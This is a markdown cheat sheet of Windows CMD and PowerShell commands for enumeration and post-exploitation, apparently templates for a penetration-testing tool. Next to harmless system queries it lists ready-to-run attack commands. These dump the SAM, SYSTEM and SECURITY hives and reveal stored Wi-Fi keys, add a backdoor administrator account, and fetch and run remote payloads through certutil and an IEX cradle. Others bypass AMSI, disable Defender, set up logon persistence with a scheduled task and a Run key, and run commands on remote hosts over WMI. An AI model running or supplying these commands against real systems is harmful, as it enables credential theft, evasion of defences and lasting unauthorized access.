# Windows Commands

> Native Windows CMD and PowerShell commands for enumeration and post-exploitation

<!-- tags: windows, cmd, powershell, post, enum -->

---

## Current User & Hostname
Show the current user, domain, and machine name.

```bash
whoami /all && hostname
```

<!-- meta: risk=safe | phase=enum | tags=whoami,hostname,context -->

---

## System Info Summary
Display detailed configuration including hotfixes and architecture.

```bash
systeminfo
```

<!-- meta: risk=safe | phase=enum | tags=systeminfo,build,patches -->

---

## Filter OS Name and Version
Quickly extract OS name and version from systeminfo.

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

<!-- meta: risk=safe | phase=enum | tags=systeminfo,os,version -->

---

## List Local Users
Show all local user accounts.

```bash
net user
```

<!-- meta: risk=safe | phase=enum | tags=net,user,local -->

---

## Show User Details
Show details, group membership, and last logon for a user.

```bash
net user {{USERNAME:str}}
```

<!-- meta: risk=safe | phase=enum | tags=net,user,details -->

---

## Add Local Admin User (Persistence)
Create a new user and add to the local Administrators group.

```bash
net user {{USERNAME:str:backup}} {{PASSWORD:str:Password123!}} /add && net localgroup administrators {{USERNAME:str:backup}} /add
```

<!-- meta: risk=high | phase=post | tags=persistence,admin,user -->

---

## List Network Configuration
Show TCP/IP configuration including DNS and IPv6.

```bash
ipconfig /all
```

<!-- meta: risk=safe | phase=enum | tags=ipconfig,network,dns -->

---

## Active Connections (netstat)
Show TCP/UDP connections, listening ports, and PIDs.

```bash
netstat -ano
```

<!-- meta: risk=safe | phase=enum | tags=netstat,connections,pid -->

---

## ARP Cache
Display the local ARP table.

```bash
arp -a
```

<!-- meta: risk=safe | phase=enum | tags=arp,table,layer2 -->

---

## Routing Table
Print the local routing table.

```bash
route print
```

<!-- meta: risk=safe | phase=enum | tags=route,routing,table -->

---

## Show Wi-Fi Profiles
List saved Wi-Fi profiles on the host.

```bash
netsh wlan show profiles
```

<!-- meta: risk=safe | phase=enum | tags=wifi,profiles,wlan -->

---

## Reveal Wi-Fi Profile Password
Display the cleartext key for a saved Wi-Fi profile.

```bash
netsh wlan show profile name="{{PROFILE:str}}" key=clear
```

<!-- meta: risk=med | phase=post | tags=wifi,password,clear -->

---

## List Installed Hotfixes
Enumerate installed Windows updates and KB numbers.

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<!-- meta: risk=safe | phase=enum | tags=wmic,hotfix,patches -->

---

## List Scheduled Tasks (Verbose)
Print all scheduled tasks with full detail.

```bash
schtasks /query /fo LIST /v
```

<!-- meta: risk=safe | phase=enum | tags=schtasks,persistence,tasks -->

---

## Search Registry for "password"
Recursively search HKLM for the string "password".

```bash
reg query HKLM /f password /t REG_SZ /s
```

<!-- meta: risk=low | phase=post | tags=registry,password,search -->

---

## Dump SAM and SYSTEM Hives
Save SAM and SYSTEM registry hives for offline cred extraction.

```bash
reg save HKLM\SAM {{SAM:file:sam.hive}} && reg save HKLM\SYSTEM {{SYSTEM:file:system.hive}}
```

<!-- meta: risk=high | phase=post | tags=sam,system,offline,hashes -->

---

## Dump SECURITY Hive
Save the SECURITY hive for LSA secret extraction.

```bash
reg save HKLM\SECURITY {{SEC:file:security.hive}}
```

<!-- meta: risk=high | phase=post | tags=security,lsa,offline -->

---

## List Stored Credentials
Show usernames and credential targets stored in Windows Credential Manager.

```bash
cmdkey /list
```

<!-- meta: risk=low | phase=post | tags=cmdkey,creds,vault -->

---

## Find Encrypted Files
Locate EFS-encrypted files on local drives.

```bash
cipher /u /n
```

<!-- meta: risk=safe | phase=post | tags=cipher,efs,encrypted -->

---

## Force Reveal Hidden Items (PowerShell)
Show hidden items including dotfiles and system files.

```bash
gci -force {{PATH:str:.}}
```

<!-- meta: risk=safe | phase=enum | tags=powershell,gci,hidden -->

---

## Download File (PowerShell IWR)
Download a file from a remote URL to disk.

```bash
iwr -Uri {{URL:url}} -OutFile {{OUTFILE:file:C:\\Users\\Public\\file.exe}}
```

<!-- meta: risk=med | phase=post | tags=powershell,iwr,download -->

---

## Download via certutil (CMD)
Use certutil to download a payload (off-by-default URL cache).

```bash
certutil -urlcache -split -f {{URL:url}} {{OUTFILE:file:C:\\Users\\Public\\payload.exe}}
```

<!-- meta: risk=med | phase=post | tags=certutil,download,lolbin -->

---

## IEX Cradle (PowerShell)
Download and execute a PowerShell script in memory.

```bash
powershell -ep bypass -nop -c "IEX (IWR {{URL:url}} -UseBasicParsing)"
```

<!-- meta: risk=high | phase=exploit | tags=powershell,iex,cradle -->

---

## Encoded Command Wrapper (PowerShell)
Base64-encode a command and run it via -EncodedCommand.

```bash
powershell -NoProfile -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('{{CMD:str:whoami}}')))
```

<!-- meta: risk=med | phase=exploit | tags=powershell,encoded,obfuscate -->

---

## AMSI In-Memory Bypass (PowerShell)
Disable AMSI for the current PowerShell session.

```bash
powershell -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
```

<!-- meta: risk=high | phase=exploit | tags=amsi,bypass,evasion -->

---

## Disable Defender Real-Time (PowerShell, Admin)
Disable Defender real-time monitoring (requires admin).

```bash
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

<!-- meta: risk=high | phase=post | tags=defender,disable,evasion -->

---

## Schtask Persistence at Logon
Create a scheduled task that runs a payload at user logon.

```bash
schtasks /create /tn "{{NAME:str:Updater}}" /tr "powershell.exe -ExecutionPolicy Bypass -File {{PAYLOAD:file:C:\\malicious.ps1}}" /sc onlogon
```

<!-- meta: risk=high | phase=post | tags=schtasks,persistence,logon -->

---

## Run Key Persistence (HKCU)
Add a registry Run value for current-user persistence.

```bash
powershell -c "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{{NAME:str:Updater}}' -Value '{{CMD:str:powershell.exe -ExecutionPolicy Bypass -File C:\\malicious.ps1}}'"
```

<!-- meta: risk=high | phase=post | tags=registry,run,persistence -->

---

## WMI Remote Process Create
Spawn a process on a remote host via WMI.

```bash
wmic /node:{{TARGET:ip}} /user:{{USERNAME:str}} /password:{{PASSWORD:str}} process call create "{{CMD:str:cmd.exe /c whoami}}"
```

<!-- meta: risk=high | phase=exploit | tags=wmic,remote,exec -->

---

## Invoke-Command Remote Execution
Run a script block on a remote host via PSRemoting.

```bash
powershell -c "Invoke-Command -ComputerName {{TARGET:str}} -ScriptBlock { {{CMD:str:Get-Process}} }"
```

<!-- meta: risk=med | phase=post | tags=powershell,invoke,remote -->

---

## Get-WmiObject SMB Shares
Enumerate SMB shares on a host via WMI.

```bash
powershell -c "Get-WmiObject -Class Win32_Share -ComputerName {{TARGET:str:.}}"
```

<!-- meta: risk=safe | phase=enum | tags=powershell,smb,shares -->

---

## Get-EventLog Security
Retrieve recent Security event log entries.

```bash
powershell -c "Get-EventLog -LogName Security -Newest {{COUNT:int:50}}"
```

<!-- meta: risk=safe | phase=enum | tags=eventlog,security,audit -->
